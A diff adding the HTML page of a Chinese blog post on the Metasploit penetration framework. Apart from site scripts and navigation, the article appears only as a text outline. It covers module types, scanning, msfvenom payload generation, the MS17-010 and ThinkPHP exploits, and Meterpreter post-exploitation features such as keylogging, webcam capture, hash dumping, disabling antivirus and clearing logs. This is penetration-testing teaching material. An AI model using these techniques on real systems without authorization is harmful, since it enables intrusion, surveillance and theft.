@@ -1,0 +1,1263 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><title>Metasploit渗透框架 | 嘻哈磕碜のBlogs</title><meta name="keywords" content="MSF"><meta name="author" content="hihopkc"><meta name="copyright" content="hihopkc"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#f7f9fe"><meta name="mobile-web-app-capable" content="yes"><meta name="apple-touch-fullscreen" content="yes"><meta name="apple-mobile-web-app-title" content="Metasploit渗透框架"><meta name="application-name" content="Metasploit渗透框架"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="#f7f9fe"><meta property="og:type" content="article"><meta property="og:title" content="Metasploit渗透框架"><meta property="og:url" content="https://hihopkc.github.io/posts/62582.html"><meta property="og:site_name" content="嘻哈磕碜のBlogs"><meta property="og:description" content="常见名词解释 POC ： Proof of Concept ，概念证明，用来证明漏洞存在的一段代码，没有攻击性 EXP ： Exploit ，利用，利用系统漏洞进行攻击的动作、方式、方法，具有攻击性 Payload ：有效载荷，指 Exploit 执行成功之后，真正在系统进行执行的代码或者指令 Sh"><meta property="og:locale" content="zh-CN"><meta property="og:image" content="https://hihopkc.github.io/img/default_cover.jpg"><meta property="article:author" content="hihopkc"><meta property="article:tag"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://hihopkc.github.io/img/default_cover.jpg"><meta name="description" content="常见名词解释 POC ： Proof of Concept ，概念证明，用来证明漏洞存在的一段代码，没有攻击性 EXP ： Exploit ，利用，利用系统漏洞进行攻击的动作、方式、方法，具有攻击性 Payload ：有效载荷，指 Exploit 执行成功之后，真正在系统进行执行的代码或者指令 Sh"><link rel="shortcut icon" href="/favicon.ico"><link rel="canonical" href="https://hihopkc.github.io/posts/62582"><link rel="preconnect" href="//cdn.cbd.int"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="google-site-verification" content="xxx"/><meta name="baidu-site-verification" content="code-xxx"/><meta name="msvalidate.01" content="xxx"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.0/swiper/swiper.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  linkPageTop: undefined,
+  peoplecanvas: undefined,
+  postHeadAiDescription: {"enable":true,"gptName":"AnZhiYu","mode":"tianli","switchBtn":false,"btnLink":"https://afdian.net/item/886a79d4db6711eda42a52540025c377","randomNum":3,"basicWordCount":1000,"key":"00af80c1b4c617346c21","Referer":"https://hihopkc.github.io/"},
+  diytitle: {"enable":true,"leaveTitle":"w(ﾟДﾟ)w 不要走！再看看嘛！","backTitle":"♪(^∇^*)欢迎肥来！"},
+  LA51: undefined,
+  greetingBox: undefined,
+  twikooEnvId: 'https://hihopkc.space/',
+  commentBarrageConfig:undefined,
+  root: '/',
+  preloader: {"source":3},
+  friends_vue_info: {"apiurl":"https://www.hihopkc.site/"},
+  navMusic: false,
+  mainTone: undefined,
+  authorStatus: {"skills":null},
+  algolia: {"appId":"R27EJ0K44Q","apiKey":"2631264c2276b5498f37a67d587bc878","indexName":"Demo","hits":{"per_page":6},"languages":{"input_placeholder":"输入关键词后按下回车查找","hits_empty":"找不到您查询的内容：${query}","hits_stats":"找到 ${hits} 条结果，用时 ${time} 毫秒"}},
+  localSearch: undefined,
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"简","rightMenuMsgToTraditionalChinese":"转为繁体","rightMenuMsgToSimplifiedChinese":"转为简体"},
+  noticeOutdate: {"limitDay":365,"position":"top","messagePrev":"It has been","messageNext":"days since the last update, the content of the article may be outdated."},
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":330},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    simplehomepage: true,
+    post: false
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: {"copy":true,"copyrightEbable":false,"limitCount":50,"languages":{"author":"作者: hihopkc","link":"链接: ","source":"来源: 嘻哈磕碜のBlogs","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。","copySuccess":"复制成功，复制和转载请标注本文地址"}},
+  lightbox: 'mediumZoom',
+  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#425AEF","bgDark":"#425AEF","position":"top-center"},
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.min.js',
+      css: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: true,
+  isAnchor: false,
+  shortcutKey: undefined,
+  autoDarkmode: true
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  configTitle: '嘻哈磕碜のBlogs',
+  title: 'Metasploit渗透框架',
+  postAI: 'true',
+  pageFillDescription: '常见名词解释, MSF简介, MSF框架结构, MSF配置数据库, MSF命令查询, 常用命令, 数据库管理命令, 核心命令, 模块命令, 作业命令, 资源脚本命令, 后端数据库命令, 后端凭证命令, 开发者命令, 攻击载荷命令, MSF模块介绍, MSF辅助扫描模块 - auxiliary, MSF主机发现, MSF服务扫描, Telnet服务扫描, SSH服务扫描, Oracle数据库扫描, SMB服务扫描, MSSQL服务扫描, FTP扫描, SMTP扫描, SNMP扫描, WMAP, MSF端口扫描, MSF攻击载荷模块 - payloads, Payload类型, singles, adduser 实例 (singles), stagers, stages, Stageless payload amp Staged payload, Payload生成, msfvenom简介, msfvenom选项, msfvenom生成payload, msfvenom使用实例, MSF漏洞利用模块 - exploits, Windows - MS17-010, Linux - Thinkphp-RCE, Meterpreter扩展模块, meterpreter简介, meterpreter 特点, 进入meterpreter, meterpreter常用shell, reverse_tcp, bind_tcp, reverse_http, reverse_https, meterpreter命令详解, 核心命令, 文件系统命令, 网络命令, 系统命令, 用户界面命令, 摄像头命令, 音频输出命令, 提权命令, 密码转储命令, Timestomp常见名词解释概念证明用来证明漏洞存在的一段代码没有攻击性利用利用系统漏洞进行攻击的动作方式方法具有攻击性有效载荷指执行成功之后真正在系统进行执行的代码或者指令一段用于利用漏洞而执行的代码为进制的机器码由于其建立正向反向而得名客户端服务端服务器的控制器是运行在目标主机上的在隐蔽信道上我们提供服务用于长期控制受感染主机的简称也就是命令与控制服务器简介的简称高度模块化即框架由多个组成是全球最受欢迎的渗透测试工具之一是一款开源安全漏洞利用和测试工具集成了各种平台上常见的溢出漏洞和流行的并持续保持更新涵盖了渗透测试中全过程你可以在这个框架下利用现有的进行一系列的渗透测试框架结构框架目录路径包含用于存储某些漏洞单词列表图像等所需二进制文件的可编辑文件包含框架的可用文档的库文件夹用来存放的插件用来存放的脚本包括及其它脚本存放多种的命令行实用程序存储的模块文件更新查看版本配置数据库支持使用数据库来保存渗透测试过程中获取的各种数据开启数据库初始化数据库创建数据库用户创建数据库创建数据库创建配置文件创建保存框架信息所需数据表启动是框架用户接口我们能通过接口使用中所有模块主要用于管理数据库管理会话配置启动模块启动时会使用创建的用户自动登录到数据库查看数据库连接状态连接到其他数据库用户名口令服务器地址端口数据库名称命令查询常用命令查看所有可用的渗透攻击程序代码查看所有可用的辅助攻击工具查看该模块可用选项查看该模块适用的所有载荷代码查看该模块适用的攻击目标类型根据关键字搜索某模块显示某模块的详细信息使用某渗透攻击模块回退设置禁用模块中的某个参数设置禁用适用于所有模块的全局参数数据库管理命令启动并初始化数据库删除并重新初始化数据库删除并停止使用数据库启动数据库停止数据库检查服务状态启动数据库并运行核心命令帮助菜单显示信息更改当前工作目录切换颜色与主机通信显示对调试有用的信息退出控制台显示可以选择加入的尚未发布的功能列表获取特定变量的值获取全局变量的值筛选以一条命令的输出帮助菜单显示命令历史记录加载框架插件退出控制台重复一个命令列表通过一个会话路由流量保存活动的数据存储导出会话列表并显示会话信息将一个特定环境的变量设置为一个值将一个全局变量设置为一个值在指定的秒数内不执行任何操作将控制台输出写入文件以及屏幕查看和操作后台线程显示有用的提示清单卸载框架插件取消设置的一个或多个变量取消设置一个或多个全局变量显示框架和控制台库版本号模块命令显示一个或多个模块的高级选项从当前环境返回清除模块堆栈将模块添加到最喜欢的模块列表中显示一个或多个模块的详细信息列表中的模块栈从路径中搜索并加载模块显示一个或多个模块全局选项将最新的模块从堆栈中弹出并使其处于活动状态将之前加载的模块设置为当前模块将活动模块或模块列表推送到模块堆栈重新加载所有模块搜索模块名称和描述显示给定类型的的模块或所有模块通过名称或搜索词索引选择使用模块作业命令启动一个处理程序作为显示和管理杀掉一个重命名一个资源脚本命令将从开始输入的命令保存到文件中运行存储在文件中的命令后端数据库命令分析关于一个特定地址或地址范围的数据库信息连接到一个现有的数据服务与当前的数据服务断开连接导出一个包含数据库内容的文件导入扫描结果文件文件类型将被自动检测执行并自动记录输出重建数据库存储的模块缓存已废弃删除已保存的数据服务条目将当前的数据服务连接保存为默认以便在启动时重新连接显示当前的数据服务状态列出数据库中的所有主机列出数据库中的所有战利品列出数据库中的所有笔记列出数据库中的所有服务列出数据库中的所有漏洞在数据库工作空间之间切换后端凭证命令列出数据库中的所有凭证开发者命令用首选编辑器编辑当前模块或文件在当前环境下打开一个交互式如果可能的话将分页显示到最后在当前模块或框架上打开调试器从指定路径重新加载库文件运行一个特定命令所需的时间攻击载荷命令检查一个目标是否易受攻击生成一个有效载荷从磁盘重新加载当前的模块用指定的有效载荷创建一个处理程序模块介绍模块是通过框架装载集成对外提供的最核心的渗透测试功能实现代码所有的漏洞测试都是基于模块中有以下种不同的模块类型模块名模块功能模块介绍辅助模块辅助渗透端口扫描登录密码爆破漏洞验证等漏洞利用模块包含主流的漏洞利用脚本通常是对某些可能存在漏洞的目标进行漏洞利用命名规则操作系统各种应用协议分类攻击载荷主要是攻击成功后在目标机器执行的代码比如反弹的代码后渗透阶段模块漏洞利用成功获得之后向目标发送的一些功能性指令如提权等编码器模块主要包含各种编码工具对进行编码加密以便绕过入侵检测和过滤系统躲避模块用来生成免杀空指令模块空指令就是空操作提高稳定性及维持大小辅助模块用于辅助操作的模块辅助模块能在渗透之前得到目标系统丰富的情报信息从而发起更具目标性的精准攻击例如针对各种网络服务的扫描与查点网络扫描枚举漏洞扫描登录口令暴力破解模糊测试爬虫遍历数据提取等此外辅助模块中还包括一些无须加载攻击载荷同时往往不是取得目标系统远程控制权的渗透攻击例如拒绝服务攻击漏洞利用模块用于利用漏洞和传递有效负载的模块利用发现的安全漏洞或配置弱点对远程目标系统进行攻击以植入和运行攻击载荷从而获得对目标系统访问控制权的代码组件有远程漏洞利用本地漏洞利用权限提升漏洞利用客户端漏洞利用应用程序漏洞利用和许多其他漏洞攻击载荷用于在利用期间执行操作的模块攻击载荷是在渗透攻击成功后在目标系统运行的一段植入代码通常是为渗透攻击者打开在目标系统上的控制会话连接在传统的渗透代码开发中攻击载荷只是一段功能简单的代码以汇编语言编制并转换为目标系统体系结构支持的机器代码在渗透攻击触发漏洞后将程序执行流程劫持并跳转入这段机器代码中执行从而完成中实现的单一功能例如建立会话反向执行命令下载和执行程序等后渗透阶段模块用于在拿到权限后进行后渗透利用操作的模块例如凭证哈希转储本地权限提升后门安装敏感数据提取网络流量隧道代理键盘记录屏幕捕获和许多其他操作编码器模块用于有效负载编码和加密的模块例如等这有助于混淆以规避防病毒或网络入侵检测系统端点检测和响应等防御规避模块用于规避防御的模块例如防病毒规避绕过软件限制策略绕过等空指令模块用于生成无害良性的无操作指令的模块例如用于填充目的在利用期间在内存中滑动等用来在攻击载荷中添加空指令区以提高攻击可靠性的组件是一些对程序运行状态不会造成任何实质影响的空操作或无关操作指令在渗透攻击构造恶意数据缓冲区时常常要在真正要执行时有一个较大的安全着陆区从而避免受到内存地址随机化返回地址计算偏差等原因造成的执行失败从而提高渗透攻击的可靠性辅助扫描模块主机发现模块路径搜索模块使用请求枚举本地局域网中的所有活跃主机通过发送数据包探查指定主机是否活跃并发现主机上的服务模块使用模块使用方法设置好参数后输入启动扫描器服务扫描服务扫描确定开放端口后对相应端口上所运行的服务信息进行挖掘模块搜索在的辅助模块中用于服务扫描和查点的工具常以和命名可用于遍历网络中包含了某种服务的主机并进一步确定服务的版本可对某种服务进行口令探测攻击在终端中可以输入查看所有可用的服务探测模块在终端中可以输入可查看所有服务登录口令探测模块服务扫描模块搜索登录扫描版本模块使用服务扫描登录公共密钥认证登录扫描版本测试数据库扫描服务扫描枚举返回信息扫描协议扫描共享文件枚举系统上的用户登录扫描组的用户扫描系统版本服务扫描登陆工具测试的存在和信息扫描版本扫描匿名登录扫描扫描枚举扫描版本扫描应用辅助扫描漏洞查找等模块基本都在下内置了扫描器要先创建一个数据库用来存放扫描数据初始化使用扫描添加要扫描的网站把添加的网站作为扫描目标查看那些模块将在扫描中使用开始扫描查看漏洞信息端口扫描模块路径模块搜索通过扫描的方式对防火墙上未被屏蔽的端口进行探测通过攻击的原理对服务进行枚举一些新的服务器软件能很好的防范此攻击但在旧的系统上仍可以被利用使用发送标志的方式探测开放端口通过一次完整的连接来判断端口是否开放最准确但是最慢一种更为隐秘的扫描方式通过发送标志能够躲避一些高级的标记检测器的过滤一般情况下推荐使用端口扫描器速度较快结果准确不易被对方察觉模块使用攻击载荷模块模块路径又称为攻击载荷主要是用来建立目标机与攻击机稳定连接的可返回也可以进行程序注入等模块保存在如下路径类型独立载荷可直接植入目标系统并执行相应的程序如这个实例添加管理员用户执行的生成程序传输器载荷用于目标机与攻击机之间建立稳定的网络连接与传输体载荷配合攻击通常该种载荷体积都非常小可以在漏洞利用后方便注入这类载荷功能都非常相似大致分为型和型型是需要攻击机主动连接目标端口的而型是目标机会反连接攻击机需要提前设定好连接攻击机的地址和端口号传输体载荷如等在建立好稳定的连接后攻击机将传输给目标机由进行相应处理将控制权转交给比如得到目标机的或者控制程序运行这样攻击机可以在本端输入相应命令控制目标机其实就是一个它需要和相应的配合运行是运行在内存中的通过注入文件实现在目标机硬盘上不会留下文件痕迹所以在被入侵时很难找到分为分阶段和不分阶段是一个二进制文件包含的所有必需部分以及所有必需的扩展全部捆绑在一起将完整的都编译在木马中体积庞大可直接独立地植入目标系统进行执行负责建立目标用户与攻击者之间的网络连接将执行传递到另一个阶段提供了传输器和传输体配对分阶段植入的技术由渗透攻击模块首先植入代码短小精悍且可靠的传输器载荷然后在运行传输器载荷时进一步下载传输体载荷并执行比如加载桌面控制等复杂的大型攻击载荷和就像入侵里面提到的大马和小马一样一个功能齐全一个只是构造一个连接或命令执行还需通过其他工具和脚本进行管理生成简介独立有效负载生成器是用来生成后门的软件在目标机上执行后门上线选项指定特定的如果被设置为那么从标准输入流中读取几乎支持全平台指定操作系统列出所有可用的项目其中值可以被设置为指定在中的数量指定的输出格式列出所有可用的输出格式指定使用编码的最流行的编码等级为解码和编码过程都是随机生成的也为指定目标系统架构安卓工业系统路由器交换机指定目标系统平台安卓设置未经编码的的最大长度编码后的的最大长度设置需要在中避免出现的字符例如等设置的编码次数尽可能生成最短的保存到文件指定一个附加的文件指定一个特定的可执行文件作为模板保护模板程序的功能注入的作为一个新的进程运行指定一个自定义的变量以确定输出格式从读取有效负载时要等待的秒数默认为为禁用查看帮助选项查看支持的输出格式列表生成生成有两个必须的选项使用来指定要使用的使用来指定的输出格式查看所有可用的列表查看支持的输出格式查看可用平台生成格式的使用自定义的需要使用比如对进行编码如果你使用了选项设定了规避字符集会自动调用编码器其他情况下你需要使用选项来使用编码模块例如查看可用的编码器迭代编码使用选项进行多次编码某些情况下迭代编码可以起到规避杀毒软件的作用但你需要知道编码并没有使用一个真正意义上的规避方案规避字符使用选项意味着在生成的时候对某些字符进行规避当你使用这个选项的时候会自动的使用合适的编码器对进行编码比如使用自定义可执行文件模板默认的使用的模板文件保存在目录中如果你想使用你自己的模板文件你可以使用选项来指定比如使用实例生成可执行程序指定类型为系统下运行的反向连接的指定反向连接的地址指定反向连接的端口号生成格式的保存为文件名开启监听生成实例生成创建监听器生成脚本实例漏洞利用模块模块路径检测目标是否存在漏洞运行攻击模块扩展模块简介是一个高级动态可扩展的简单理解是一个高级的里面封装了的功能是框架中的一个扩展模块作为溢出成功以后的攻击载荷使用攻击载荷在溢出攻击成功以后给我们返回一个控制通道使用它作为攻载荷能够获得目标系统的一个的链接作为渗透模块有很多有用的功能比如添加一个用户隐藏一些东西打开得到用户密码上传下载远程主机的文件运行捉屏幕得到远程控制权捕获按键信息清除应用程序显示远程主机的系统信息显示远程机器的网络接口和地址等信息特点提供了各个主流平台的版本包括同时支持平台另外还提供了基于和语言的实现的工作模式是纯内存的好处是启动隐藏很难被杀毒软件监测到不需要访问目标主机磁盘所以也没什么入侵的痕迹除上述外还支持脚本形式的扩展进入将当前挂起列出当前所有的进入某个常用命令放回后台关闭会话帮助信息系统平台信息屏幕截取命令行退出查看本地目录切换本地目录查看目录查看文件目录列表切换目录删除文件下载文件上传文件搜索文件执行程序命令查看进程查看当前用户权限关闭杀毒软件启用远程桌面常用基于的反弹基于的正向连接因为在内网跨网段时无法连接到攻击者的机器所以在内网中经常会使用不需要设置基于方式的反向连接在网速慢的情况下不稳定基于方式的反向连接在网速慢的情况下不稳定命令详解核心命令帮助菜单将当前会话移动到后台的别名总之后台脚本列出后台运行中的脚本作为一个后台线程运行脚本显示活动频道关闭通道禁用字符串的编码启用字符串的编码终止会话帮助菜单显示有关模块的信息在当前会话上打开交互式外壳加载一个或多个扩展获取连接到会话的计算机的将服务迁移到另一个进程管理侦听器打开当前会话上的调试器终止会话从通道中读取数据运行存储在文件中的命令执行一个脚本或者模块在会话中协商分组加密快速切换到另外一个设置当前会话的超时值强制停止活动然后重新建立会话改变目前的运输机制加载的扩展的旧别名获取当前会话的将数据写入到一个通道文件系统命令读取并输出到标准输出文件的内容更改目录对受害人检索文件的校验和将源复制到目标列出文件别名为下载文件或目录编辑文件输出本地工作目录输出工作目录更改本地工作目录列出本地文件输出本地工作目录列出当前目录中的文件列表创建目录将源移动到目标删除指定的文件删除目录在目标主机文件系统上查找搜索文件例如在目标主机盘下搜索文档列出所有装载点逻辑驱动器上传文件或目录网络命令显示主机缓存显示当前代理配置显示网络接口的关键信息显示网络接口的关键信息显示网络连接将本地端口转发到远程服务例如把目标主机的端口转发到端口解析目标上的一组主机名查看或加入受害者路由表用会话加入指定网段系统命令清除事件日志放弃任何活动模拟令牌执行命令在目标主机上运行某个程序执行目标主机上的记事本程序隐藏后台执行加参数获取一个或多个环境变量值获取当前进程尝试启用当前进程可用的所有权限获取当前运行服务用户的获取当前运行服务的用户终止进程显示目标系统的本地日期和时间按名称显示进程按名称终止进程列出正在运行的进程重新启动受害人的计算机与受害人的注册表进行交互在受害者机器上调用在远程计算机上打开一个关闭远程计算机试图窃取指定的进程的令牌挂起或恢复进程列表获取关于远程系统的信息如操作系统用户界面命令列出所有可访问的和获取当前的桌面检查长时间以来受害者系统空闲进程发送一个键盘记录器发送事件转储键盘记录器缓冲区内容启动键盘记录器停止键盘记录器发送鼠标事件实时监视远程用户的桌面抓取交互式桌面的屏幕截图更改当前桌面启用用户界面组件的一些控件摄像头命令从默认麦克风记录音频秒启动视频聊天列出摄像头从指定的网络摄像头获取从指定的网络摄像头播放视频流音频输出命令在目标系统上播放波形音频文件提权命令获得系统管理员权限密码转储命令抓取哈希密码文件中的值可以跳过杀毒软件但现在有两个脚本都更加隐蔽和操作修改文件的属性修改时间访问时间创建时间条目修改时间',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2023-09-18 22:08:55',
+  postMainColor: '',
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#18171d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#f7f9fe')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
+          const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
+          const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
+          const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
+
+          if (t === undefined) {
+            if (isLightMode) activateLightMode()
+            else if (isDarkMode) activateDarkMode()
+            else if (isNotSpecified || hasNoSupport) {
+              const now = new Date()
+              const hour = now.getHours()
+              const isNight = hour <= 6 || hour >= 18
+              isNight ? activateDarkMode() : activateLightMode()
+            }
+            window.matchMedia('(prefers-color-scheme: dark)').addListener(e => {
+              if (saveToLocal.get('theme') === undefined) {
+                e.matches ? activateDarkMode() : activateLightMode()
+              }
+            })
+          } else if (t === 'light') activateLightMode()
+          else activateDarkMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><link rel="stylesheet" href="/css/style.css"><meta name="generator" content="Hexo 6.3.0"></head><body data-type="anzhiyu"><div id="web_bg"></div><div id="an_music_bg"></div><div id="loading-box" onclick="document.getElementById(&quot;loading-box&quot;).classList.add(&quot;loaded&quot;)"><div class="loading-bg"><img class="loading-img nolazyload" alt="加载头像" src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202303232356277.png"/><div class="loading-image-dot"></div></div></div><script>const preloader = {
+  endLoading: () => {
+    document.getElementById('loading-box').classList.add("loaded");
+  },
+  initLoading: () => {
+    document.getElementById('loading-box').classList.remove("loaded")
+  }
+}
+window.addEventListener('load',()=> { preloader.endLoading() })
+setTimeout(function(){preloader.endLoading();},10000)
+
+if (true) {
+  document.addEventListener('pjax:send', () => { preloader.initLoading() })
+  document.addEventListener('pjax:complete', () => { preloader.endLoading() })
+}</script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.10/progress_bar/progress_bar.css"/><script async="async" src="https://cdn.cbd.int/pace-js@1.2.4/pace.min.js" data-pace-options="{ &quot;restartOnRequestAfter&quot;:false,&quot;eventLag&quot;:false}"></script><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><div id="nav-group"><span id="blog_name"><a id="site-name" href="/" accesskey="h"><div class="title">嘻哈磕碜のBlogs</div><i class="anzhiyufont anzhiyu-icon-house-chimney"></i></a></span><div class="mask-name-container"><div id="name-container"><a id="page-name" href="javascript:anzhiyu.scrollToDest(0, 500)">PAGE_NAME</a></div></div><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><i class="anzhiyufont anzhiyu-icon-box-archive faa-tada" style="font-size: 0.9em;"></i><span> 归档</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><i class="anzhiyufont anzhiyu-icon-shapes faa-tada" style="font-size: 0.9em;"></i><span> 分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags faa-tada" style="font-size: 0.9em;"></i><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/link/"><i class="anzhiyufont anzhiyu-icon-link faa-tada" style="font-size: 0.9em;"></i><span> 友人帐</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/fcircle/"><i class="anzhiyufont anzhiyu-icon-artstation faa-tada" style="font-size: 0.9em;"></i><span> 朋友圈</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/comments/"><i class="anzhiyufont anzhiyu-icon-envelope faa-tada" style="font-size: 0.9em;"></i><span> 留言板</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 我的</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/music/"><i class="anzhiyufont anzhiyu-icon-music faa-tada" style="font-size: 0.9em;"></i><span> 音乐馆</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/bangumis/"><i class="anzhiyufont anzhiyu-icon-bilibili faa-tada" style="font-size: 0.9em;"></i><span> 追番页</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/album/"><i class="anzhiyufont anzhiyu-icon-images faa-tada" style="font-size: 0.9em;"></i><span> 相册集</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 关于</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><i class="anzhiyufont anzhiyu-icon-paper-plane faa-tada" style="font-size: 0.9em;"></i><span> 关于本人</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/essay/"><i class="anzhiyufont anzhiyu-icon-lightbulb faa-tada" style="font-size: 0.9em;"></i><span> 闲言碎语</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/equipment/"><i class="anzhiyufont anzhiyu-icon-dice-d20 faa-tada" style="font-size: 0.9em;"></i><span> 我的装备</span></a></li></ul></div></div></div><div id="nav-right"><div class="nav-button" id="randomPost_button"><a class="site-page" onclick="toRandomPost()" title="随机前往一个文章" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-dice"></i></a></div><div class="nav-button" id="search-button"><a class="site-page social-icon search" href="javascript:void(0);" title="搜索🔍" accesskey="s"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span> 搜索</span></a></div><input id="center-console" type="checkbox"/><label class="widget" for="center-console" title="中控台" onclick="anzhiyu.switchConsole();"><i class="left"></i><i class="widget center"></i><i class="widget right"></i></label><div id="console"><div class="console-card-group-reward"><ul class="reward-all console-card"><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png" target="_blank"><img class="post-qr-code-img" alt="wechat" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png"/></a><div class="post-qr-code-desc">wechat</div></li><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png" target="_blank"><img class="post-qr-code-img" alt="alipay" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png"/></a><div class="post-qr-code-desc">alipay</div></li></ul></div><div class="console-card-group"><div class="console-card-group-left"><div class="console-card" id="card-newest-comments"><div class="card-content"><div class="author-content-item-tips">互动</div><span class="author-content-item-title"> 最新评论</span></div><div class="aside-list"><span>正在加载中...</span></div></div></div><div class="console-card-group-right"><div class="console-card tags"><div class="card-content"><div class="author-content-item-tips">兴趣点</div><span class="author-content-item-title">寻找你感兴趣的领域</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/ChatGpt/" style="font-size: 